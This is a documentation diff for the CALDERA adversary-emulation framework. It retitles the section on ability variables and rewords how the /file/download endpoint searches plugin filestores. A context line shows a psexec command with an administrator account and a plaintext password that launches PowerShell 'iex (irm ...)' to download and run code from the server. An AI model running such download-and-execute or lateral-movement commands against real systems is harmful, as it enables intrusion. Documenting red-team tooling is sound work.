@@ -33,7 +33,7 @@ Below is an example ability
     rm /tmp/wifi.sh
 ```
 
-### Variables in abilities
+### Ability variables
 
 As you write abilities, note that there are two global variables available, server and group, which 
 can be used inside an ability command.
@@ -57,7 +57,7 @@ psexec \\127.0.0.1 -u administrator -p password123 Powershell.exe iex (irm -Meth
 In the ability example, note the command downloading the wifi.sh file from CALDERA. It does this by sending a
 POST request to the API endpoint /file/download, including the requested filename as a header.
 
-Any file located in a plugin's filestore directory can be downloaded using this syntax.
+The /file/download endpoint will look inside the filestore directory of every plugin when called.
 
 ### Cleanup
 
